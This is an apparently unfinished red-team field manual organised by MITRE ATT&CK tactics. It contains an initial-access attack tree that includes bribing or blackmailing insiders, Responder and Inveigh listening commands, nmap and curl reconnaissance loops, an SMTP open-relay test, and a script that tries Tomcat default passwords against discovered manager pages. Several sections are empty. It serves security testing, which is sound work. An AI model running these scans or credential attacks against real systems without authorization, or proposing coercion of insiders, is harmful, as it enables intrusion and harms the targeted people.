

<!-- MarkdownTOC depth=3 autolink=true -->

- [Operational Considerations](#operational-considerations)
    - [Goals](#goals)
    - [Operation Planning](#operation-planning)
    - [Toolbox](#toolbox)
- [Tactical Objectives](#tactical-objectives)
    - [Ops-Sec Considerations](#ops-sec-considerations)
    - [Attack Infrastructure](#attack-infrastructure)
    - [Getting Access](#getting-access)
    - [Discovery](#discovery)
    - [Credential Access](#credential-access)
    - [Lateral Movement](#lateral-movement)
- [Techniques: Ops-Sec Considerations]
- [Techniques: Attack Infrastructure]
- [Techniques: Getting Access]
- [Techniques: Discovery](#techniques-discovery)
    - [Passive techniques](#passive-techniques)
- [Techniques: Credential Access](#techniques-credential-access)
- [Techniques: Lateral Movement](#techniques-lateral-movement)
    - [Vulnerable/misconfigured Network Devices](#vulnerablemisconfigured-network-devices)
    - [Vulnerable/misconfigured Remote Services](#vulnerablemisconfigured-remote-services)
        - [SMTP](#smtp-service)
    - [Vulnerable/misconfigured HTTP/HTTPS Remote Services](#vulnerablemisconfigured-httphttps-remote-services)

<!-- /MarkdownTOC -->

# Security Testing Field Manual

Introduction and purpose.

# Operational Considerations

## Goals

List of possible goals.

## Operation Planning

```
1. Set goal(s): objectives to accomplish
2. Combine various tactics to achieve your operational goal(s)
3. Select appropriate tachniques (and choose suitable tools) to achieve your tactical goals
```

## Toolbox

# Tactical Objectives

## Ops-Sec Considerations

MITRE PRE-ATT&CK: [TA0021](https://attack.mitre.org/tactics/TA0021/)

## Attack Infrastructure

MITRE PRE-ATT&CK: [TA0022](https://attack.mitre.org/tactics/TA0022/)

## Getting Access

*Tactical goal: get IP address in target's internal network*

MITRE ATT&CK: [TA0001](https://attack.mitre.org/tactics/TA0001/)

Possible techniques (in a form of attack tree):

```
1. [OR] Social Engineering
1.1. [OR] Delivery of phishing email/message
1.1.1. Malicious link (T1192)
1.1.2. Malicious attachment (T1193)
1.1.3. Malicious social media message (T1194)
1.2. Drive-by compromise (T1189)
1.3. [OR] "Tasking" insider to plant connect-back implant
1.3.1. by fooling him (e.g. run it for me; print doc from this USB)
1.3.2. by bribing him
1.3.3. by blackmailing him
1.4. Fooling insider to reveal his credentials (T1078)
...

2. [OR] Breaching the perimeter/DMZ
2.1. Exploit Public-Facing Application (T1190)
2.2. Exploit remote access mechanism (T1133)
...

3. [OR] Proximity attacks
3.1. Hacking into wireless network
3.2. Using USB drive drops (T1091)
3.3. [OR] Breaching physical perimeter
3.3.1. Plant drop-in device and plug it into network
3.3.2. Plant USB device and plug it to existing machine
...

4. [OR] Exploiting Trusted Relationship (T1199)
4.1. [OR] Hack 3rd party entity that delivers service to target (T1195)
4.1.1. Open source Software supplier 
4.1.2. Commercial Software supplier 
4.1.3. Hack company that provides services to the target
4.1.4. Hack target's contractor worker
4.2. [AND] Hack "to be acquired" company
4.2.1. Get knowledge about near aquisitions
4.2.1. Hack the company that is going to be acquired 
4.3. [AND] Build trust relationship with the target
4.3.1. Work as a contractor for the target
4.3.2. Exploit the trust that was built
...
```

## Discovery

*Tactical goal: Understand the target environment*

MITRE ATT&CK: [TA0007](https://attack.mitre.org/tactics/TA0007/)

Questions that should be asked:

```
What's the network topology? Is it flat?
Where are egress points?
Where are "multi-homed" boxes?
```

## Credential Access

*Tactical goal: Acquire valid set of credentials*

MITRE ATT&CK: [TA0006](https://attack.mitre.org/tactics/TA0006/)

## Lateral Movement

MITRE ATT&CK: [TA0008](https://attack.mitre.org/tactics/TA0008/)

# Techniques: Discovery

## Passive techniques

MITRE ATT&CK: [T1040](https://attack.mitre.org/techniques/T1040/)

Sniffing:

```
```

OS fingerprinting:

```
# Linux
screen -L -d -m responder -I eth0 -A -f

# Windows
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -Inspect Y
```

# Techniques: Credential Access

# Techniques: Lateral Movement

## Vulnerable/misconfigured Network Devices

MITRE ATT&CK: N/A

```
# looking for telnet, SNMP, TFTP, Cisco 'SIET' port (4786)
sudo nmap -n -Pn -sS -sU -pT:23,69,4786,4001,U:161,162 -iL scope.txt -T4 --open -oG network-devices.out
cat network-devices.out | grep -v '161/open|filtered/udp//snmp///' | grep -v '162/open|filtered/udp//snmptrap///' | grep -v 'Status: Up' > network-devices.txt

# look for SSH daemons with router/swich related banners
nmap -n -Pn -sS -T4 -p22 -iL scope.txt -oG - --open -sV --version-intensity 0 | grep -v 'Status: Up' | tee ssh-banners.out | grep -i cisco
also grep for: 
OpenSSH 12.1 - Palo Alto PA Firewall

# discovery of additional network devices via multicast broadcasting
nmap --script mrinfo -e ens160 -d
nmap -sU -p 5351 --script=nat-pmp-info 10.10.10.0/24 -d --open
nmap --script broadcast-pim-discovery -e ens160 -d --script-args 'broadcast-pim-discovery.timeout=15'
nmap --script='broadcast-eigrp-discovery,broadcast-igmp-discovery,broadcast-ospf2-discover' -e ens160 --script-args 'broadcast-igmp-discovery.version=all, broadcast-igmp-discovery.timeout=13' -d

# looking for devices web panels:
# (after masscan, only ports 80)
screen -d -m /bin/bash -c $'for i in $(cat masscan-allPorts.min | grep \':80$\'); do echo "$i:"; timeout 7s curl -s -L -k -I "http://$i"; done | tee http-headers.out'

# (from IP list only, only port 80)
while read i; do echo "$i:"; timeout 7s curl -s -L -k -I "http://$i"; done < IPs.txt > http-headers.out
screen -d -m /bin/bash -c 'while read i; do echo "$i:"; timeout 7s curl -s -L -k -I "http://$i"; done < IPs.txt > http-headers.out'

# (BEST: wth URLS list already generated)
screen -d -m /bin/bash -c 'while read i; do echo "$i:"; timeout 7s curl -s -L -k -I "$i"; done < urls.txt | tee http-headers.out'

then grep for: level_15_access|ios|cisco|level_15_or_view_access

TODO: 
----
http://vulnerabilityassessment.co.uk/Penetration%20Test.html
find: Cisco Specific Testing


https://gitlab.com/kalilinux/packages/cisco-global-exploiter/raw/kali/master/cge.pl

https://gitlab.com/kalilinux/packages/cisco-auditing-tool/tree/kali/master

http://www.vulnerabilityassessment.co.uk/cisco.htm
-----
```

## Vulnerable/misconfigured Remote Services 

MITRE ATT&CK: T1021 / T1210

### SMTP service

Ports:

    TCP: 25,587,465

Implementations:

    https://en.wikipedia.org/wiki/List_of_mail_server_software#SMTP

Common misconfiguration: SMTP Open Relay

```
HELO ABC
MAIL FROM: foo@domain.com
RCPT TO: bar@domain.com
DATA
Testing for SMTP open relay issue.
.
QUIT
```

Noteworthy vulnerabilities:

```
```

## Vulnerable/misconfigured HTTP/HTTPS Services

MITRE ATT&CK: T1021 / T1210

### Apache Tomcat: default/weak credentials

```
Use auxiliary/scanner/http/tomcat_mgr_login
```

OR (if many different ports are used)
```
Prereq: Nmap scan results imported to msf

msf> services -S Coyote -c port -o /tmp/tomcat.csv
$ for i in $(cat /tmp/tomcat.csv | tr -d '"' | tr ',' ':'); do echo "http://$i/manager/html"; done > tomcat-urls.txt

$ wget https://raw.githubusercontent.com/netbiosX/Default-Credentials/master/Apache-Tomcat-Default-Passwords.mdown

$ cat Apache-Tomcat-Default-Passwords.mdown | tr -d ' ' | awk -F'|' '{print $2":"$3}' > PAYLOADS/tomcat-defaults.txt

$ while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults.txt); do curl -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"; echo; done; done < tomcat-urls.txt > tomcats-results.txt
```
